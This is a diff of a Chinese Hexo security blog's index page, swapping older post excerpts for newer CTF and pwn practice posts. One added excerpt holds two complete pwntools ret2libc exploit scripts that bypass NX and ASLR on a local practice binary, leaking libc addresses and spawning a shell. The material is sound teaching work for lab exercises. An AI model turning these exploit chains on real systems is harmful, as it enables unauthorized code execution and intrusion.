@@ -487,7 +487,7 @@
 
 
   
-    <article id="post-pwn练习-一-之缓冲区溢出" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-pwnable.tw第一题starrt" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -497,7 +497,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/29/pwn练习-一-之缓冲区溢出/">pwn练习(一)之缓冲区溢出</a>
+      <a class="article-title" href="/2017/01/23/pwnable.tw第一题starrt/">pwnable.tw第一题start</a>
     </h1>
   
       
@@ -505,16 +505,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a href="/image/PWN练习之爆破绕过canary/passcode">passcode</a></p>
+        <p><a href="/image/pwnable.tw第一题start/printf1">printf1</a><br>
         <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/12/29/pwn练习-一-之缓冲区溢出/#more">more >></a>
+          <a class="article-more-a"  href="/2017/01/23/pwnable.tw第一题starrt/#more">more >></a>
         </p>
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/12/29/pwn练习-一-之缓冲区溢出/" class="archive-article-date">
-  	<time datetime="2016-12-29T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-29</time>
+      <a href="/2017/01/23/pwnable.tw第一题starrt/" class="archive-article-date">
+  	<time datetime="2017-01-23T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-01-23</time>
 </a>
       
 	<div class="article-tag tagcloud">
@@ -539,7 +539,7 @@
 
 
   
-    <article id="post-PWN练习之爆破绕过canary" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-pwn练习(三)之绕过NX和ALSR" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -549,7 +549,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/23/PWN练习之爆破绕过canary/">PWN练习之爆破绕过canary</a>
+      <a class="article-title" href="/2017/01/15/pwn练习(三)之绕过NX和ALSR/">pwn练习(三)之绕过NX和ALSR</a>
     </h1>
   
       
@@ -557,16 +557,48 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a href="/image/PWN练习之爆破绕过canary/test.zip">test</a><br>使用方法：在当前目录下创建一个名为“flag”的文件，里面随便写一个密码，运行后即可成为靶机。</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/12/23/PWN练习之爆破绕过canary/#more">more >></a>
-        </p>
+        <a id="more"></a>
+<p>通过一个例子来看看如何使用ret2lib绕过NX和ASLR。</p>
+<p>程序很简单，看IDA:<br><img src="/image/pwn练习(三" alt="这里写图片描述">之绕过NX和ALSR/1.png)<br><img src="/image/pwn练习(三" alt="这里写图片描述">之绕过NX和ALSR/2.png)</p>
+<p>很明显的缓冲区溢出。checksec查看，程序开了NX保护，并且可以用命令查看，每次的堆栈都是发生了变化的，说明系统中开了ASLR保护的。<br>sudo cat /proc/[pid]/maps</p>
+<p>给出pwntools的两个脚本：<br>脚本一（给出libc的情况下）：<br>from pwn import *</p>
+<p>p = process(‘./rop’)<br>libc = ELF(‘./libc.so’)<br>elf = ELF(‘./rop’)</p>
+<p>offset = 0xd078-0xcff0+4</p>
+<p>write_plt = elf.symbols[‘write’]     #0x8048340<br>write_got = elf.got[‘write’]         #0x804a018<br>vuln_addr = elf.symbols[‘vuln’]     #0x804844d</p>
+<p>print ‘write_plt -&gt; ‘ + hex(write_plt)<br>print ‘write_got -&gt; ‘ + hex(write_got)<br>print ‘vuln -&gt; ‘ + hex(vuln_addr)</p>
+<p>payload = ‘A’ * offset<br>payload += p32(write_plt)<br>payload += p32(vuln_addr)<br>payload += p32(1)<br>payload += p32(write_got)<br>payload += p32(4)</p>
+<p>#gdb.attach(proc.pidof(p)[0], ‘b *0x8048474’)</p>
+<p>#raw_input()</p>
+<p>p.sendline(payload)</p>
+<p>write_addr = u32(p.recv(4))<br>print ‘write_addr -&gt; ‘ + hex(write_addr)</p>
+<p>system_addr = write_addr -  (libc.symbols[‘write’] - libc.symbols[‘system’] )<br>binsh_addr = write_addr -  (libc.symbols[‘write’] - next(libc.search(‘/bin/sh’)))</p>
+<p>payload = ‘A’ * offset<br>payload += p32(system_addr)<br>payload += p32(0xdeadbeef)<br>payload += p32(binsh_addr)</p>
+<p>p.sendline(payload)</p>
+<p>p.interactive()</p>
+<p>脚本二（未给出libc的情况下）:<br>from pwn import *</p>
+<p>p = process(‘./rop’)<br>elf = ELF(‘./rop’)</p>
+<p>offset = 0xd078-0xcff0+4</p>
+<p>write_plt = elf.symbols[‘write’]     #0x8048340<br>write_got = elf.got[‘write’]         #0x804a018<br>vuln_addr = elf.symbols[‘vuln’]     #0x804844d<br>read_plt = elf.symbols[‘read’]</p>
+<p>def leak(address):<br>    payload = ‘A’ * offset<br>    payload += p32(write_plt)<br>    payload += p32(vuln_addr)<br>    payload += p32(1)<br>    payload += p32(address)<br>    payload += p32(4)</p>
+<pre><code>p.sendline(payload)
+data = p.recv()
+print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
+return data
+</code></pre><p>d = DynELF(leak, elf = ELF(‘./rop’))<br>system_addr = d.lookup(“system”, “libc”)</p>
+<p>print ‘system_addr -&gt;’  + hex(system_addr)</p>
+<p>#write ‘/bib/sh’  to .bss</p>
+<p>bss_addr = 0x804a024</p>
+<p>payload = ‘A’ * offset<br>payload += p32(read_plt)<br>payload += p32(vuln_addr)<br>payload += p32(0)<br>payload += p32(bss_addr)<br>payload += p32(8)</p>
+<p>p.sendline(payload)<br>p.sendline(‘/bin/sh’)</p>
+<p>payload = ‘A’ * offset<br>payload += p32(system_addr)<br>payload += p32(vuln_addr)<br>payload += p32(bss_addr)</p>
+<p>p.sendline(payload)<br>p.interactive()</p>
+
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/12/23/PWN练习之爆破绕过canary/" class="archive-article-date">
-  	<time datetime="2016-12-23T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-23</time>
+      <a href="/2017/01/15/pwn练习(三)之绕过NX和ALSR/" class="archive-article-date">
+  	<time datetime="2017-01-15T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-01-15</time>
 </a>
       
 	<div class="article-tag tagcloud">
@@ -591,7 +623,7 @@
 
 
   
-    <article id="post-看雪CTF-2016第二十题Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-pwn练习(二)之修改got表" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -601,7 +633,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/15/看雪CTF-2016第二十题Writeup/">看雪CrackMe第二十题之多线程反调试及程序异常处理</a>
+      <a class="article-title" href="/2017/01/04/pwn练习(二)之修改got表/">pwn练习(二)之修改got表</a>
     </h1>
   
       
@@ -609,21 +641,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>源程序：<a href="http://pan.baidu.com/s/1o8wbmVg">http://pan.baidu.com/s/1o8wbmVg</a><br>本题的反调试只有三种，现在理解了之后再去看就比较简单了。由于之前对于多线程的反调试以及程序异常处理（SEH）没有太多的了解，所以结合这题恶补了一下这方面的知识，收获颇多。</p>
+        <p><a href="/image/pwn练习(二">bf</a>之修改got表/bf)</p>
         <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/12/15/看雪CTF-2016第二十题Writeup/#more">more >></a>
+          <a class="article-more-a"  href="/2017/01/04/pwn练习(二)之修改got表/#more">more >></a>
         </p>
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/12/15/看雪CTF-2016第二十题Writeup/" class="archive-article-date">
-  	<time datetime="2016-12-15T09:09:43.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-12-15</time>
+      <a href="/2017/01/04/pwn练习(二)之修改got表/" class="archive-article-date">
+  	<time datetime="2017-01-04T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-01-04</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
 	</div>
 
       
@@ -721,7 +753,7 @@ var _hmt = _hmt || [];
     
     	<section class="tools-section tools-section-tag">
     			<div class="widget tagcloud" id="js-tagcloud">
-    				<a href="/tags/C/" style="font-size: 16.67px;">C</a> <a href="/tags/CrackMe/" style="font-size: 16.67px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.67px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/Windows/" style="font-size: 13.33px;">Windows</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 16.67px;">漏洞挖掘</a> <a href="/tags/病毒分析/" style="font-size: 10px;">病毒分析</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
+    				<a href="/tags/C/" style="font-size: 18.33px;">C</a> <a href="/tags/CrackMe/" style="font-size: 15px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.67px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/Windows/" style="font-size: 13.33px;">Windows</a> <a href="/tags/ctf/" style="font-size: 16.67px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 18.33px;">漏洞挖掘</a> <a href="/tags/病毒分析/" style="font-size: 10px;">病毒分析</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
     			</div>
     	</section>
     
